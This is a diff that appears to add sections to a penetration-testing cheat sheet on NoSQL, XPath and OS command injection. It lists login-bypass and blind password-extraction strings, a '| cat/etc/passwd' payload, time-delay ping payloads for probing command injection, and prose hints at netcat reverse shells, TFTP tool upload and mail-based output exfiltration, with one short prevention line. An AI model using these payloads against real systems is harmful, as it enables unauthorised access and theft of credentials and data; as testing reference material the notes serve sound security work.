@@ -739,3 +739,91 @@ If you don't have much space and know there is no vulnerable JavaScript on the p
 '';!--"<XSS>=&{()}
 
     
+    
+NoSQL injection
+------
+Javascript
+---
+If javascript login does something like {return this.username == 'username' & this.password == 'password'}, it can be circumvented by:
+
+    Username'//
+    
+For the username, where the ' closes the 'username' string and the // comments out the password conjunction. Alternatively, the following willl also return true:
+
+    a' || 1==1 || 'a'=='a
+    
+XPath (XML)
+--
+XML is frequently used to store application configured data which may be retrieved on the basis of user input. They may also be used by smaller applications to persist simple information such as user credentials, roles, and privileges.
+
+Consider:
+    //address[surname/text()='User' and password/text()='secret']/ccard/text()
+    
+Supplying a password with this value:
+        
+    ' or 'a'='a
+    
+will retrieve the cc details of all users    
+
+queries are case-sensitive, as are element names of the document itself
+
+    ' or //address[surname/text()='Gates' and substring(password/text(),1,1)=='M'] and 'a'='a
+    
+Can be used to determine a passwords value 1 character at a time by how the application responds 
+
+This can be used to discover the entire layout of the file and learn all of the node types in the document
+
+`count()` returns the number of child nodes of a given element
+`string.length()` returns the length of a supplied string
+
+Prevention: Accept only alpha-numeric characters, block ()='[]:,*/ and whitespace
+
+
+OS command injection
+----
+Shell metacharacters are useful:
+    
+    A simple pipe | cat/etc/passwd can dump the contents of the passwd file. 
+    & is used to batch multiple commands, supplying a filename containing & and a second command causes the command to be executed
+
+eval/exec/Execute with user input are prime targets
+
+php:
+    ; can be used to batch commands in a single parameter
+
+; | & newline can be used to batch multiple commands
+    
+    && on Windows causes second command to run only if the first was successful
+    || always runs the second command
+    
+the backtick character ` can be used to encapsulate a separate command within a data item being processed by the original command
+    
+Introducing a time delay:
+        
+    || ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+    
+To maximize success when the application filters certain command separators:
+    
+    | ping -i 30 127.0.0.1 |
+    | ping -n 30 127.0.0.1 |
+    & ping -i 30 127.0.0.1 &
+    & ping -n 30 127.0.0.1 &
+    ; ping 127.0.0.1 ;
+    %0a ping-i 30 127.0.0.1 %0a
+    ` ping 127.0.0.1 `
+    
+If a time delay occurs, the application may be vulnerable to command injection
+
+If unable to retrieve results directly, try:
+    
+    TFTP to copy tools to the server
+    using telnet or netcat to create a reverse shell
+    using the mail command to send command output via SMTP
+    redirect output from commands to the web root, which will allow them to be found with a web browser
+    
+Determine your privilege level using whoami, or attempt to write a harmless file to a protected directory    
+
+    < is used to direct contents of a file to the commands input
+    > is used to direct a commands output to a file
+    
+    
